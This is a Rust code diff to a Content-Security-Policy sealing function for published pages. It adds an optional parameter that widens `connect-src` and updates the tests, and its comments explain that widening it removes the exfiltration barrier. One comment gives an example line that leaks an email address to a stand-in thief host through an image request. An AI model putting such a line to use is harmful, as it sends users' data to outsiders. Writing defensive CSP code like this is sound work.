@@ -57,7 +57,11 @@ pub struct SealResult {
     pub errors: Vec<String>,
 }
 
-pub fn seal_release(html: &str, form_action_extra: Option<&str>) -> SealResult {
+pub fn seal_release(
+    html: &str,
+    form_action_extra: Option<&str>,
+    connect_src_extra: Option<&str>,
+) -> SealResult {
     let doc = kuchikiki::parse_html().one(html);
     let mut errors: Vec<String> = Vec::new();
 
@@ -91,7 +95,7 @@ pub fn seal_release(html: &str, form_action_extra: Option<&str>) -> SealResult {
     } else {
         let has_3d = html.contains("data-ol-has-3d-block");
         let assets = collect_asset_origins(&doc);
-        let policy = build_policy(&script_hashes, &external_scripts, form_action_extra, has_3d, &assets);
+        let policy = build_policy(&script_hashes, &external_scripts, form_action_extra, connect_src_extra, has_3d, &assets);
         inject_csp_meta(&doc, &policy);
         sealed = true;
     }
@@ -376,6 +380,7 @@ fn build_policy(
     hashes: &[String],
     externals: &[String],
     form_action_extra: Option<&str>,
+    connect_src_extra: Option<&str>,
     has_3d: bool,
     assets: &AssetOrigins,
 ) -> String {
@@ -424,7 +429,27 @@ fn build_policy(
     // destino ajeno es el envío de formularios, que ya viaja en este mismo
     // parámetro. Que coincida con form-action no es casualidad: es el mismo
     // origen, por eso se reutiliza en vez de duplicar la fuente de verdad.
-    let connect_src = form_action.clone();
+    //
+    // `connect_src_extra` es la puerta de salida, y la decide TypeScript a
+    // propósito: la POLÍTICA vive donde un interruptor es gratis, no aquí
+    // dentro, donde cambiarla cuesta recompilar el módulo nativo y desplegar.
+    // Con `None` el comportamiento es el de siempre, byte a byte.
+    //
+    // ⚠️ ABRIR ESTO ES ABRIR LA BARRERA, no una rendija. Las directivas de
+    // abajo (img/media/font) existen para tapar la fuga por la puerta de al
+    // lado —`new Image().src = "https://ladron/?" + correo`—; con `fetch`
+    // libre, cerrarlas deja de proteger de la exfiltración. Lo que SIGUE
+    // cerrado es `form-action`: los envíos de formulario sólo van a OpenLen.
+    //
+    // Lo que hace defendible abrirlo (decisión de Jesús, 2026-08-24): el
+    // script del modelo está FIJADO POR HASH en esta misma CSP —no se puede
+    // cambiar después de publicar— y el creador puede leerlo desde el visor
+    // `</>` del taller. Es más control del que da cualquier hosting que sirve
+    // páginas de usuario, y ninguno de ellos restringe connect-src.
+    let connect_src = match connect_src_extra {
+        Some(extra) if !extra.trim().is_empty() => format!("{} {}", form_action, extra.trim()),
+        _ => form_action.clone(),
+    };
     // worker-src 'none': ningún bake nuestro crea Worker, SharedWorker ni
     // service worker — comprobado en lib/publish, lib/three3d y este crate. Un
     // worker es el sitio natural donde esconder trabajo de red o de CPU, así
@@ -505,7 +530,7 @@ mod tests {
     #[test]
     fn scriptless_page_gets_script_src_none() {
         let html = r#"<html><head><meta charset="utf-8"></head><body><p>hi</p></body></html>"#;
-        let r = seal_release(html, None);
+        let r = seal_release(html, None, None);
         assert!(r.sealed);
         assert!(r.html.contains("script-src 'none'"));
         assert!(r.html.contains("object-src 'none'"));
@@ -522,7 +547,7 @@ mod tests {
         // Only the canonical YouTube/Vimeo embed origins may be framed; the
         // sanitizer strips user iframes, so nothing else should ever be framed.
         let html = r#"<html><head></head><body><p>x</p></body></html>"#;
-        let r = seal_release(html, None);
+        let r = seal_release(html, None, None);
         assert!(r
             .html
             .contains("frame-src https://www.youtube-nocookie.com https://player.vimeo.com https://www.google.com;"));
@@ -537,7 +562,7 @@ mod tests {
             r#"<html><head></head><body><script>{}</script></body></html>"#,
             body
         );
-        let r = seal_release(&html, None);
+        let r = seal_release(&html, None, None);
         assert!(r.sealed);
         assert_eq!(r.script_hashes, vec![hash_token(body)]);
         assert!(r.html.contains(&hash_token(body)));
@@ -547,7 +572,7 @@ mod tests {
     fn raw_text_script_with_operators_hashes_exact_bytes() {
         let body = "if(a<b&&c>0){fetch('/c/x',{keepalive:true})}";
         let html = format!(r#"<body><script>{}</script></body>"#, body);
-        let r = seal_release(&html, None);
+        let r = seal_release(&html, None, None);
         assert!(r.sealed);
         assert_eq!(r.script_hashes, vec![hash_token(body)]);
         // Serialization must not have altered the script body (self-check
@@ -559,7 +584,7 @@ mod tests {
     fn external_cdn_script_allowlisted_by_origin() {
         let html =
             r#"<head><script src="https://cdn.tailwindcss.com"></script></head><body></body>"#;
-        let r = seal_release(html, None);
+        let r = seal_release(html, None, None);
         assert!(r.sealed);
         assert_eq!(r.external_scripts, vec!["https://cdn.tailwindcss.com"]);
         assert!(r.html.contains("script-src https://cdn.tailwindcss.com;"));
@@ -568,7 +593,7 @@ mod tests {
     #[test]
     fn mixed_inline_and_external_both_in_policy() {
         let html = r#"<head><script src="https://cdn.tailwindcss.com/"></script></head><body><script>x()</script></body>"#;
-        let r = seal_release(html, None);
+        let r = seal_release(html, None, None);
         assert!(r.sealed);
         assert!(r.html.contains(&hash_token("x()")));
         assert!(r.html.contains("https://cdn.tailwindcss.com"));
@@ -577,14 +602,14 @@ mod tests {
     #[test]
     fn duplicate_inline_scripts_hash_once() {
         let html = r#"<body><script>same()</script><script>same()</script></body>"#;
-        let r = seal_release(html, None);
+        let r = seal_release(html, None, None);
         assert_eq!(r.script_hashes.len(), 1);
     }
 
     #[test]
     fn base_tags_stripped() {
         let html = r#"<html><head><base href="https://evil.example/"></head><body></body></html>"#;
-        let r = seal_release(html, None);
+        let r = seal_release(html, None, None);
         assert_eq!(r.bases_stripped, 1);
         assert!(!r.html.contains("<base"));
     }
@@ -592,7 +617,7 @@ mod tests {
     #[test]
     fn target_blank_gains_noopener_preserving_rel_tokens() {
         let html = r#"<body><a href="https://x.com" target="_blank" rel="nofollow">x</a><a href="/in" target="_self">y</a></body>"#;
-        let r = seal_release(html, None);
+        let r = seal_release(html, None, None);
         assert_eq!(r.noopener_added, 1);
         assert!(r.html.contains(r#"rel="nofollow noopener""#));
     }
@@ -600,7 +625,7 @@ mod tests {
     #[test]
     fn existing_noopener_not_duplicated() {
         let html = r#"<body><a href="https://x.com" target="_blank" rel="noopener">x</a></body>"#;
-        let r = seal_release(html, None);
+        let r = seal_release(html, None, None);
         assert_eq!(r.noopener_added, 0);
         assert_eq!(r.html.matches("noopener").count(), 1);
     }
@@ -608,7 +633,7 @@ mod tests {
     #[test]
     fn form_action_extra_origin_included() {
         let html = "<html><head></head><body></body></html>";
-        let r = seal_release(html, Some("https://openlen.com"));
+        let r = seal_release(html, Some("https://openlen.com"), None);
         assert!(r.html.contains("form-action 'self' https://openlen.com"));
     }
 
@@ -619,13 +644,38 @@ mod tests {
     #[test]
     fn connect_src_confines_egress_to_self_and_submit_origin() {
         let html = "<html><head></head><body></body></html>";
-        let r = seal_release(html, Some("https://openlen.com"));
+        let r = seal_release(html, Some("https://openlen.com"), None);
         assert!(r.sealed);
         assert!(r.html.contains("connect-src 'self' https://openlen.com"));
         // Sin origen de envío no se cuela un comodín: se queda en 'self'.
-        let solo = seal_release(html, None);
+        let solo = seal_release(html, None, None);
         assert!(solo.html.contains("connect-src 'self';"));
         assert!(!solo.html.contains("connect-src *"));
+    }
+
+    // La salida de red de una página publicada. La POLÍTICA la decide
+    // TypeScript (`pageNetworkExtra`); aquí sólo se comprueba que el parámetro
+    // llega a `connect-src` y NO se cuela en `form-action`, que es la promesa
+    // que sigue en pie: los envíos de formulario van sólo a OpenLen.
+    #[test]
+    fn connect_src_extra_abre_la_red_sin_tocar_form_action() {
+        let html = "<html><head></head><body><form></form></body></html>";
+        let r = seal_release(html, Some("https://openlen.com"), Some("https: wss:"));
+        let csp = r.html.clone();
+        assert!(csp.contains("connect-src 'self' https://openlen.com https: wss:"), "{csp}");
+        // Con la comilla de cierre: `form-action` es la ÚLTIMA directiva, así
+        // que si `https: wss:` se hubiera colado ahí, esto no casaría.
+        assert!(csp.contains("form-action 'self' https://openlen.com\""), "{csp}");
+    }
+
+    #[test]
+    fn sin_extra_el_sello_es_el_de_siempre() {
+        // Byte a byte: el kill-switch tiene que devolver EXACTAMENTE lo de
+        // antes, o revertir no sería revertir.
+        let html = "<html><head></head><body><p>x</p></body></html>";
+        let a = seal_release(html, Some("https://openlen.com"), None);
+        let b = seal_release(html, Some("https://openlen.com"), Some("   "));
+        assert_eq!(a.html, b.html);
     }
 
     /// Ningún bake nuestro crea Worker ni service worker — es el sitio natural
@@ -633,7 +683,7 @@ mod tests {
     /// primera página capaz de abrir uno.
     #[test]
     fn worker_src_is_closed() {
-        let r = seal_release("<html><head></head><body></body></html>", None);
+        let r = seal_release("<html><head></head><body></body></html>", None, None);
         assert!(r.html.contains("worker-src 'none'"));
     }
 
@@ -642,7 +692,7 @@ mod tests {
     /// NADA restringiendo las imágenes. Es la vía de fuga más barata que existe.
     #[test]
     fn img_src_is_closed_to_unknown_origins() {
-        let r = seal_release("<html><head></head><body><p>x</p></body></html>", None);
+        let r = seal_release("<html><head></head><body><p>x</p></body></html>", None, None);
         assert!(r.sealed);
         assert!(r.html.contains("img-src 'self' data: blob:;"));
         assert!(r.html.contains("media-src 'self' data: blob:"));
@@ -661,7 +711,7 @@ mod tests {
             <img src="https://images.openlen.com/b.webp">
             <video src="https://cdn.ejemplo.test/v.mp4" poster="https://otro.test/p.jpg"></video>
             </body></html>"#;
-        let r = seal_release(html, None);
+        let r = seal_release(html, None, None);
         assert!(r.sealed);
         let csp = r.html.clone();
         // La imagen, el fondo por CSS y el póster del vídeo.
@@ -680,7 +730,7 @@ mod tests {
     #[test]
     fn an_origin_not_in_the_document_is_not_allowed() {
         let html = r#"<html><head></head><body><img src="https://images.openlen.com/a.webp"></body></html>"#;
-        let r = seal_release(html, None);
+        let r = seal_release(html, None, None);
         assert!(r.html.contains("https://images.openlen.com"));
         assert!(!r.html.contains("ladron.test"));
     }
@@ -690,14 +740,14 @@ mod tests {
     /// y el CDN de Tailwind inyecta estilo en tiempo de ejecución.
     #[test]
     fn style_src_keeps_inline_working() {
-        let r = seal_release("<html><head><style>p{color:red}</style></head><body></body></html>", None);
+        let r = seal_release("<html><head><style>p{color:red}</style></head><body></body></html>", None, None);
         assert!(r.html.contains("style-src 'self' 'unsafe-inline'"));
     }
 
     #[test]
     fn author_csp_meta_leaves_page_unsealed_but_hardened() {
         let html = r#"<html><head><meta http-equiv="Content-Security-Policy" content="default-src 'self'"><base href="/x"></head><body></body></html>"#;
-        let r = seal_release(html, None);
+        let r = seal_release(html, None, None);
         assert!(!r.sealed);
         assert!(!r.html.contains("data-ol-csp"));
         assert!(r.html.contains("default-src 'self'")); // author meta intact
@@ -708,7 +758,7 @@ mod tests {
     #[test]
     fn relative_script_src_bails_without_meta() {
         let html = r#"<body><script src="/js/app.js"></script></body>"#;
-        let r = seal_release(html, None);
+        let r = seal_release(html, None, None);
         assert!(!r.sealed);
         assert!(!r.html.contains("data-ol-csp"));
         assert_eq!(r.errors.len(), 1);
@@ -718,7 +768,7 @@ mod tests {
     fn meta_placed_after_charset() {
         let html =
             r#"<html><head><meta charset="utf-8"><title>t</title></head><body></body></html>"#;
-        let r = seal_release(html, None);
+        let r = seal_release(html, None, None);
         let charset_pos = r.html.find("charset").unwrap();
         let csp_pos = r.html.find("data-ol-csp").unwrap();
         let title_pos = r.html.find("<title>").unwrap();
@@ -728,7 +778,7 @@ mod tests {
     #[test]
     fn meta_first_in_head_without_charset() {
         let html = r#"<html><head><title>t</title></head><body></body></html>"#;
-        let r = seal_release(html, None);
+        let r = seal_release(html, None, None);
         let csp_pos = r.html.find("data-ol-csp").unwrap();
         let title_pos = r.html.find("<title>").unwrap();
         assert!(csp_pos < title_pos);
@@ -737,8 +787,8 @@ mod tests {
     #[test]
     fn reseal_is_idempotent() {
         let html = r#"<html><head><meta charset="utf-8"></head><body><a href="https://x.com" target="_blank">x</a><script>go()</script></body></html>"#;
-        let once = seal_release(html, Some("https://openlen.com"));
-        let twice = seal_release(&once.html, Some("https://openlen.com"));
+        let once = seal_release(html, Some("https://openlen.com"), None);
+        let twice = seal_release(&once.html, Some("https://openlen.com"), None);
         assert!(twice.sealed);
         assert_eq!(once.html, twice.html);
         assert_eq!(once.html.matches("data-ol-csp").count(), 1);
@@ -749,7 +799,7 @@ mod tests {
         // The policy value carries single quotes — they must serialize intact
         // inside the double-quoted content attribute.
         let html = r#"<body><script>q()</script></body>"#;
-        let r = seal_release(html, None);
+        let r = seal_release(html, None, None);
         assert!(r.html.contains("content=\"script-src 'sha256-"));
     }
 
@@ -769,8 +819,8 @@ mod tests {
         let with_3d = "<html><head></head><body><div data-ol-has-3d-block></div><script>1</script></body></html>";
         let plain = "<html><head></head><body><script>1</script></body></html>";
 
-        let sealed_3d = seal_release(with_3d, None);
-        let sealed_plain = seal_release(plain, None);
+        let sealed_3d = seal_release(with_3d, None, None);
+        let sealed_plain = seal_release(plain, None, None);
 
         assert!(sealed_3d.sealed, "3D page should be sealed");
         assert!(sealed_plain.sealed, "plain page should be sealed");
